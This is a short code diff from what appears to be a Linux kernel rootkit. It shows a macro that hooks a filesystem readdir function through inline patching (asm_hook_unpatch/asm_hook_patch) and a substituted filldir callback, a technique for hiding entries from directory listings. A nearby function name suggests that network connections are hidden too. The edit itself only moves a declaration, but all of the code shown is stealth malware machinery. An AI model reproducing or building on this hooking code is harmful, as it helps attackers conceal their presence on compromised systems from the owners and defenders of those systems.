@@ -901,9 +901,9 @@ static int n_udp6_seq_show ( struct seq_file *seq, void *v )
         int NAME##_readdir(struct file *file, void *dirent, filldir_t filldir) \
         { \
 	    int ret; \
+	    int (*original_readdir)(struct file *, void *, filldir_t); \
             original_##NAME##_filldir = filldir; \
             \
-            int (*original_readdir)(struct file *, void *, filldir_t); \
             original_readdir = asm_hook_unpatch(NAME##_readdir); \
             ret = original_readdir(file, dirent, NAME##_filldir); \
             asm_hook_patch(NAME##_readdir); \
